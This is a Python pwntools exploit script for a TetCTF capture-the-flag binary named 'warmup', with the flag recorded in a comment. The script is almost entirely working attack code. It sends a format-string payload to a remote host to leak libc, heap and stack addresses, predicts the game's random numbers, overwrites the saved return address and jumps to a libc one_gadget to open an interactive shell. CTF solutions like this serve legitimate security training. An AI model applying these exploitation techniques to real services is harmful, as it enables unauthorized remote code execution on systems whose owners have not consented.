#Exploit for warmup
#flag = TetCTF{viettel: *100*311267385452644#}
from pwn import *
elf = ELF('./warmup')
libc = ELF('./libc-2.23.so')
gadgets = [0x45226, 0x4527a, 0xf0364, 0xf1207]
def sla(s, d):
	target.sendlineafter(s, d)

def sa(s, d):
	target.sendafter(s, d)

#target = process(['./warmup', './ld-2.23.so'], env={"LD_PRELOAD":"./libc-2.23.so"})
target = remote('192.46.228.70', 32337)

money = 0x4141414141414141
sla("How much money you want? ", str(money))

name  = "A"*8
name += "%" + str(0x58-8) + "x" + "%25$hhn"
name += ".%29$lx"	#-->points to __libc_start_main + 240
name += ".%25$lx"	#-->for heap leak
name += ".%26$lx."	#-->for stack leak
sla("Player name: ", name)
target.recvuntil("A"*8)
target.recvuntil(".")
libc_base = int(target.recvuntil(".").strip("."), 0x10) - (libc.sym['__libc_start_main'] + 240)
chunk88 = int(target.recvuntil(".").strip("."), 0x10)
money_i = chunk88 - (0x55e96a013420 - 0x55e96a013010)
saved_rip_at = int(target.recvuntil(".").strip("."), 0x10) - (0x7ffd665ff660 - 0x7ffd665ff638)
money_f = saved_rip_at						#address to be overwritten during feedback

target.recvuntil("Round:")
target.recvuntil(": ")
init_money1 = int(target.recvuntil(" ").strip(" "), 10)
bet_money = 1
sla("to exit): ", str(bet_money))
lucky = 1
sla("Your choice: ", str(lucky))
target.recvuntil("Lucky number: ")
lucky1 = int(target.recvline().strip(), 10)			#Lucky number 1
	
target.recvuntil("Round:")
target.recvuntil(": ")
init_money2 = int(target.recvuntil(" ").strip(" "), 10)
lucky2 = init_money1 - init_money2 - 1				#Lucky number 2
bet_money = 1
sla("to exit): ", str(bet_money))
lucky = 1
sla("Your choice: ", str(lucky))
target.recvuntil("Lucky number: ")
lucky3 = int(target.recvline().strip(), 10)			#Lucky number 3	
	
#insert brute force here
rand_gen = process("./rand_gen")
rand_gen.sendline(str(lucky1))
rand_gen.sendline(str(lucky2))
rand_gen.sendline(str(lucky3))
r1 = int(rand_gen.recvline().strip(), 0x10)
r2 = int(rand_gen.recvline().strip(), 0x10)
print rand_gen.recvline()
rand_gen.close()
	
target.recvuntil("Round:")
target.recvuntil(": ")
curr_money = int(target.recvuntil(" ").strip(" "), 10)
bet_money = money_f - curr_money - r2
sla("to exit): ", str(bet_money))
sla("Your choice: ", str(r1))
target.recvuntil("Lu")
print target.recvline()
	
sla("to exit): ", str(0))
	
#'''
log.info("LIBC Base: " + hex(libc_base))
log.info("Chunk88: " + hex(chunk88))
log.info("Initial Money: " + hex(money_i))
log.info("Final Money: " + hex(money_f))
log.info("Saved RIP at: " + hex(saved_rip_at))
log.info("r1: " + hex(r1) + " or " + str(r1) + " r2: " + hex(r2))
log.info("Bet money: " + hex(bet_money))
#'''
	
target.recvuntil("Game Over\n")
sla("feeback: ", p64(libc_base + gadgets[2]))
target.interactive()
